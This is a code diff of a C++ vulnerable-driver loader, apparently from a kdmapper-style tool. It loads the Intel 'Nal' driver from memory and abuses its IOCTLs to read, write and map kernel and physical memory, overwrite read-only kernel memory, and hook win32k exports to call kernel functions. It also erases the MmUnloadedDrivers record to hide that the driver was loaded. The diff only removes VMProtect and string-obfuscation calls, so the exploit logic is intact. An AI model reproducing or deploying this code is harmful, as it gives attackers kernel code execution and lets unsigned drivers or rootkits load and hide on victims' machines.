@@ -1,18 +1,18 @@
 #include "intel_driver.hpp"
-#include "../../Universal/vmprotect.h"
+
 
 HANDLE intel_driver::Load()
 {
-	Protect();
+	
 
-	std::cout << E("Loading vulnerable driver") << std::endl;
+	std::cout << ("Loading vulnerable driver") << std::endl;
 
 	char temp_directory[MAX_PATH] = { 0 };
 	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
 
 	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
 	{
-		std::cout << E("Failed to get temp path") << std::endl;
+		std::cout << ("Failed to get temp path") << std::endl;
 		return nullptr;
 	}
 
@@ -21,24 +21,24 @@ HANDLE intel_driver::Load()
 
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
 	{
-		std::cout << E("Failed to create vulnerable driver file") << std::endl;
+		std::cout << ("Failed to create vulnerable driver file") << std::endl;
 		return nullptr;
 	}
 
 	if (!service::RegisterAndStart(driver_path))
 	{
-		std::cout << E("Failed to register and start service for the vulnerable driver") << std::endl;
+		std::cout << ("Failed to register and start service for the vulnerable driver") << std::endl;
 		std::remove(driver_path.c_str());
 		return nullptr;
 	}
-	ProtectEnd();
+	
 	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 }
 
 void intel_driver::Unload(HANDLE device_handle)
 {
-	Protect();
-	std::cout << E("Unloading vulnerable driver") << std::endl;
+	
+	std::cout << ("Unloading vulnerable driver") << std::endl;
 
 	ClearMmUnloadedDrivers(device_handle);
 	CloseHandle(device_handle);
@@ -51,12 +51,12 @@ void intel_driver::Unload(HANDLE device_handle)
 	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
 
 	std::remove(driver_path.c_str());
-	ProtectEnd();
+	
 }
 
 bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
 {
-	Protect();
+	
 	if (!destination || !source || !size)
 		return 0;
 
@@ -68,13 +68,13 @@ bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t 
 	copy_memory_buffer.length = size;
 
 	DWORD bytes_returned = 0;
-	ProtectEnd();
+	
 	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
 {
-	Protect();
+	
 	if (!address || !size)
 		return 0;
 
@@ -86,13 +86,13 @@ bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t va
 	fill_memory_buffer.length = size;
 
 	DWORD bytes_returned = 0;
-	ProtectEnd();
+	
 	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address)
 {
-	Protect();
+	
 	if (!address)
 		return 0;
 
@@ -107,13 +107,13 @@ bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, ui
 		return false;
 
 	*out_physical_address = get_phys_address_buffer.return_physical_address;
-	ProtectEnd();
+	
 	return true;
 }
 
 uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size)
 {
-	Protect();
+	
 	if (!physical_address || !size)
 		return 0;
 
@@ -127,13 +127,13 @@ uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_addres
 
 	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
 		return 0;
-	ProtectEnd();
+	
 	return map_io_space_buffer.return_virtual_address;
 }
 
 bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size)
 {
-	Protect();
+	
 	if (!address || !size)
 		return false;
 
@@ -144,7 +144,7 @@ bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t
 	unmap_io_space_buffer.number_of_bytes = size;
 
 	DWORD bytes_returned = 0;
-	ProtectEnd();
+	
 	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
@@ -160,7 +160,7 @@ bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buf
 
 bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
 {
-	Protect();
+	
 	if (!address || !buffer || !size)
 		return false;
 
@@ -168,7 +168,7 @@ bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address,
 
 	if (!GetPhysicalAddress(device_handle, address, &physical_address))
 	{
-		std::cout << E("Failed to translate virtual address 0x") << reinterpret_cast<void*>(address) << std::endl;
+		std::cout << ("Failed to translate virtual address 0x") << reinterpret_cast<void*>(address) << std::endl;
 		return false;
 	}
 
@@ -176,21 +176,21 @@ bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address,
 
 	if (!mapped_physical_memory)
 	{
-		std::cout << E("Failed to map IO space of 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
+		std::cout << ("Failed to map IO space of 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
 		return false;
 	}
 
 	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);
 
 	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
-		std::cout << E("[!] Failed to unmap IO space of physical address 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
-	ProtectEnd();
+		std::cout << ("[!] Failed to unmap IO space of physical address 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
+	
 	return result;
 }
 
 uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
 {
-	Protect();
+	
 	if (!size)
 		return 0;
 
@@ -203,13 +203,13 @@ uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_typ
 
 	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size))
 		return 0;
-	ProtectEnd();
+	
 	return allocated_pool;
 }
 
 bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
 {
-	Protect();
+	
 	if (!address)
 		return 0;
 
@@ -217,13 +217,13 @@ bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
 
 	if (!kernel_ExFreePool)
 		kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");
-	ProtectEnd();
+	
 	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
 }
 
 uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name)
 {
-	Protect();
+	
 	if (!kernel_module_base)
 		return 0;
 
@@ -275,13 +275,13 @@ uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kern
 	}
 
 	VirtualFree(export_data, 0, MEM_RELEASE);
-	ProtectEnd();
+	
 	return 0;
 }
 
 bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint64_t* out_kernel_original_function_address)
 {
-	Protect();
+	
 	// 488b05650e1400 mov     rax, qword ptr [rip+offset]
 	// ff150f211600   call    cs:__guard_dispatch_icall_fptr
 
@@ -294,7 +294,7 @@ bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_hand
 
 		if (!kernel_NtGdiDdDDIReclaimAllocations2)
 		{
-			std::cout << E("Failed to get export win32kbase.NtGdiDdDDIReclaimAllocations2") << std::endl;
+			std::cout << ("Failed to get export win32kbase.NtGdiDdDDIReclaimAllocations2") << std::endl;
 			return false;
 		}
 
@@ -312,7 +312,7 @@ bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_hand
 
 	*out_kernel_function_ptr = kernel_function_ptr;
 	*out_kernel_original_function_address = kernel_original_function_address;
-	ProtectEnd();
+	
 	return true;
 }
 
@@ -320,7 +320,7 @@ bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_han
 {
 	// 48ff2551d81f00   jmp	cs:__imp_NtGdiGetCOPPCompatibleOPMInformation
 	// cccccccccc       padding
-	Protect();
+	
 	static uint64_t kernel_function_ptr = 0;
 	static uint8_t kernel_original_jmp_bytes[12] = { 0 };
 
@@ -330,7 +330,7 @@ bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_han
 
 		if (!kernel_NtGdiGetCOPPCompatibleOPMInformation)
 		{
-			std::cout << E("Failed to get export win32kfull.NtGdiGetCOPPCompatibleOPMInformation") << std::endl;
+			std::cout << ("Failed to get export win32kfull.NtGdiGetCOPPCompatibleOPMInformation") << std::endl;
 			return false;
 		}
 
@@ -342,13 +342,13 @@ bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_han
 
 	*out_kernel_function_ptr = kernel_function_ptr;
 	memcpy(out_kernel_original_bytes, kernel_original_jmp_bytes, sizeof(kernel_original_jmp_bytes));
-	ProtectEnd();
+	
 	return true;
 }
 
 bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 {
-	Protect();
+	
 	ULONG buffer_size = 0;
 	void* buffer = nullptr;
 
@@ -415,6 +415,6 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 
 	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
 		return false;
-	ProtectEnd();
+	
 	return true;
 }
